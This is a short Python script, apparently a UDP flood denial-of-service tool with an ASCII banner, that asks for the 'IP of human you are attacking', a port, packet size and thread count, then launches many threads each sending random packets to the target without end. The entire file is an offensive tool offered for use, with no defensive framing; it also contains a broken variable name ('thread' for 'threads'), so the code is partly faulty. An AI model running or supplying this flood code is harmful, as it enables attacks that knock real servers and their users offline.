import threading
import socket
import random
import sys
import ctypes
import os

def start(ip, port, size, index):
    data = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)         
    while True:
        data.sendto(random._urandom(size), (ip, port))
        print(f"|| You've sent {size} bytes to {ip}")
        
        
        
def main():
    try:
        if len(sys.argv) < 5:
           print('''
           ███████╗███████╗██████╗░░█████╗░███╗░░██╗██╗░░░██╗██╗░░░░░██╗░░░░░███████╗██████╗░
           ╚════██║██╔════╝██╔══██╗██╔══██╗████╗░██║██║░░░██║██║░░░░░██║░░░░░██╔════╝██╔══██╗
           ░░███╔═╝█████╗░░██████╔╝██║░░██║██╔██╗██║██║░░░██║██║░░░░░██║░░░░░█████╗░░██████╔╝
           ██╔══╝░░██╔══╝░░██╔══██╗██║░░██║██║╚████║██║░░░██║██║░░░░░██║░░░░░██╔══╝░░██╔══██╗
           ███████╗███████╗██║░░██║╚█████╔╝██║░╚███║╚██████╔╝███████╗███████╗███████╗██║░░██║
           ╚══════╝╚══════╝╚═╝░░╚═╝░╚════╝░╚═╝░░╚══╝░╚═════╝░╚══════╝╚══════╝╚══════╝╚═╝░░╚═╝
           Version 0.0.2''')
        target= input("IP of human you are attacking? \n") if len(sys.argv) < 2 else sys.argv[1]
        port= int(input("Port? (80) \n")) if len(sys.argv) < 3 else int(sys.argv[2])
        packet= int(input("Packet size? (1000) \n")) if len(sys.argv) < 4 else int(sys.argv[3])
        threads= int(input("Threads? (1000) \n")) if len(sys.argv) < 5 else int(sys.argv[4])

        if port > 65535 or port < 1:
            print("\n<<ERROR>> Port should be between 1, 65535")
            sys.exit(1)

        if packet > 65500 or packet < 1:
            print("\n<<ERROR>> Size should be between 1 and 65500")
            sys.exit(1)

    except KeyboardInterrupt:
        print("\nSee you soon :)")
        sys.exit()
    
    except Exception as e:
        print(f"\n<<ERROR>> {e}")
        sys.exit()

    for i in range(thread):
        try:
            t = threading.Thread(target=start, args=(target, port, packet, i))
            t.start()
        except Exception as e:
            print(f"\n<<ERROR>> An error ocurred initializing thread {i}: {e}")            

if __name__ == "__main__":
    main()
